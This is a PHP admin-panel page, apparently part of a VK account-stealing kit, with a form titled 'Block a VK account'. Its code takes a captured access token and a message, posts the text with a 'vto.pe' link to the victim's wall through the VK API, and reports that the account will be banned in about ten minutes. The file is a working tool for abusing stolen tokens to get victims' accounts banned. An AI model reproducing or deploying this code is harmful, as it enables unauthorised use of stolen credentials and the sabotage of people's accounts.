<?
include '../bdlog.php';
if(!isset($_SESSION['admin'])) { echo '
  <META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">
  <style> body {display:none !important;}'; }

if(isset($_GET['baan'])) {
  $ttokenban = $_GET['tokenban'];
  $textban = $_GET['textban'];

  $ffff = json_decode(file_get_contents('https://api.vk.com/method/wall.post?v=5.103&message='.$textban.'+vto.pe&access_token='.$ttokenban));


  echo ' <center> <div class="callout callout-success">
  <h5>Успех!</h5>
  <p>Аккаунт будет забанен примерно через <b>10</b> минут.</p>
</div> </center> 
  
  
  
  <META HTTP-EQUIV="REFRESH" CONTENT="2;URL=/admin/banvk.php">';
  }

?><!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="en">
<head>
  <meta charset="utf-8"><meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#6CD089;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL [<?=$colvousers?>]</span></center>
    </a>


    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>
  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
          <div class="col-sm-6">

            <center><div class="content">
      <div class="container-fluid">
    <div class="col-md-12" style="display:inline-block;">
            
            <!-- /.card -->

            <div class="card card-primary">
              <div class="card-header">
                <h3 class="card-title">Заблокировать аккаунт VK // business_dark</h3>
              </div>
              </div>
                <div class="form-group">
                    <label >Укажите текст, который будет показываться человеку во время бана</label>
                    <input type="text" class="form-control" name="textban" placeholder="Если слов несколько, пишите вот так - слово1+слово2">
                  </div>
                  

				<div class="form-group">
                    <label >Укажите токен от страницы</label>
                    <input type="text" class="form-control" name="tokenban" value="">
                  </div>
                  <input type="hidden" name="baan">
                  </div>
          
          <!-- /.card-body -->

          <div class="card-footer">
            <button type="submit" class="btn btn-primary">Заблокировать</button>
          </div>
        </form>
      </div>
				 </center>
          </div>
        </div><!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content-header -->

    <!-- Main content -->
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>